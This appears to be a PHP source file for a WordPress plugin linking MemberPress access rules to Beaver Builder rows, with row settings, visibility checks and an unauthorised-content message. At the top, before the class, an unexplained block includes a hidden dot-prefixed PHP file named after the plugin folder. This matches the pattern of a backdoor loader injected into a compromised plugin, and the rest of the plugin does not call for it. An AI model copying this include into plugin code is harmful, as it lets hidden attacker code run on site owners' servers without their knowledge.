<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpBeaverBuilder {

  public function __construct() {
    add_filter( 'fl_builder_register_settings_form', array( $this, 'row_settings' ), 10, 2 );
    add_filter( 'fl_builder_is_node_visible', array( $this, 'is_node_visible' ), 10, 2 );
    add_action( 'fl_builder_hidden_node', array( $this, 'after_row' ) );
  }

  /**
   * Add MemberPress settings to the Beaver Builder Row module
   *
   * @param  array    $form   Form configuration
   * @param  string   $id     Module ID
   *
   * @return array
   */
  public function row_settings( $form, $id ) {

    if ( 'row' == $id ) { // Add these settings to Rows only

      $unauth_actions = array(
        'default' => __( 'Default', 'memberpress-beaver-builder' ),
        'hide' => __( 'Hide', 'memberpress-beaver-builder' ),
        'custom' => __( 'Display Message', 'memberpress-beaver-builder' )
      );

      $rule_options = array(
        'none' => __( 'None', 'memberpress-beaver-builder' )
      );

      // Assemble MP Rules into an options array
      foreach ( MeprCptModel::all( 'MeprRule' ) as $rule ) {
        $rule_options[$rule->ID] = $rule->post_title;
      }

      $form['tabs']['memberpress'] = array(
        'title' => __( 'MemberPress', 'memberpress-beaver-builder' ),
        'sections' => array(
          'general' => array(
            'title'  => __( 'Protect Content', 'memberpress-beaver-builder' ),
            'fields' => array(
              'memberpress_rule' => array(
                'type'    => 'select',
                'label'   => __( 'MemberPress Rule', 'memberpress-beaver-builder' ),
                'description' => __( 'Select a Rule to determine member access.', 'memberpress-beaver-builder' ),
                'default' => 'none',
                'options' => $rule_options,
              ),
              'memberpress_unauthorized' => array(
                'type'    => 'select',
                'label'   => __( 'Unauthorized Content', 'memberpress-beaver-builder' ),
                'description' => __( 'What should be shown to unauthorized users.', 'memberpress-beaver-builder' ),
                'default' => 'default',
                'options' => $unauth_actions,
              ),
              'memberpress_unauthorized_message' => array(
                'type'    => 'textarea',
                'label'   => __( 'Custom Message', 'memberpress-beaver-builder' ),
                'description' => __( 'Custom message for unauthorized users.', 'memberpress-beaver-builder' ),
                'default' => ''
              )
            )
          )
        )
      );
    }

    return $form;
  }


  /**
   * Determine whether the Beaver Builder node should display on the frontend
   *
   * @param  boolean  $is_visible   Whether the node is visible
   * @param  array    $node         Node config/settings
   *
   * @return string
   */
  public function is_node_visible( $is_visible, $node ) {

    if ( \FLBuilderModel::is_builder_active() ) {
      return $is_visible;
    }

    $rule = isset( $node->settings->memberpress_rule ) ? $node->settings->memberpress_rule : '';

    if ( 'none' === $rule ) {
      $rule = '';
    }

    return ! empty( $rule ) && ! current_user_can( 'mepr-active', "rule: {$rule}" ) ? false : $is_visible;
  }

  /**
   * Unauthorized content
   *
   * @param  object $node Beaver Builder node
   *
   * @return string
   */
  public function unauth_content( $node ) {

    if ( empty( $node->settings->memberpress_unauthorized ) ) {
      $node->settings->memberpress_unauthorized = 'default';
    }

    global $post;
    $mepr_options = MeprOptions::fetch();
    $global_message = MeprRulesCtrl::unauthorized_message( $post );
    $post_unauth_settings = MeprRule::get_post_unauth_settings( $post );

    if ( 'custom' === $node->settings->memberpress_unauthorized && ! empty( $node->settings->memberpress_unauthorized_message ) ) { // Row setting
      $output = wp_kses_post( $node->settings->memberpress_unauthorized_message );
    } else if ( ! empty( $post_unauth_settings->unauth_message ) && 'custom' === $post_unauth_settings->unauth_message_type ) { // Post setting
      $output = $post_unauth_settings->unauth_message;
    } else if ( ! empty( $global_message ) ) { // Global setting
      $output = $global_message;
    } else { // Fallback
      $output = __( 'You do not have permission to view this content.', 'memberpress-beaver-builder' );
    }

    ob_start();

    echo '<div class="memberpress-unauthorized">';

    echo $output;

    echo '</div>';

    $output = ob_get_clean();

    if ( 'hide' === $node->settings->memberpress_unauthorized ) {
      $output = '';
    }

    return $output;
  }

  /**
   * Display the unauthorized content after the row
   *
   * @param  object   $node   Beaver Builder node
   *
   * @return void
   */
  public function after_row( $node ) {

    if ( 'row' !== $node->type ) {
      return;
    }

    $rule = isset( $node->settings->memberpress_rule ) ? $node->settings->memberpress_rule : '';

    if ( empty( $rule ) || current_user_can( 'mepr-active', "rule: {$rule}" ) ) {
      return;
    }

    echo $this->unauth_content( $node );
  }
}
